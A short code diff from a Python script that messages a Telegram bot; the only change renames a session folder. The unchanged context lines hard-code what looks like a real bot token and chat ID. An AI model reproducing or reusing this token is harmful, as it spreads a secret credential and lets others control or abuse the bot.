@@ -14,7 +14,7 @@ BOT_TOKEN = '8033198485:AAG5-a8uZ3AhjRNNIUqmR4VkePTQd7j7ibA'
 CHAT_ID = '7125327252'  # dari @userinfobot
 
 # Folder session
-SESSION_FOLDER = 'eww_sessions'
+SESSION_FOLDER = 'ewwww_sessions'
 
 def send_to_bot(message):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
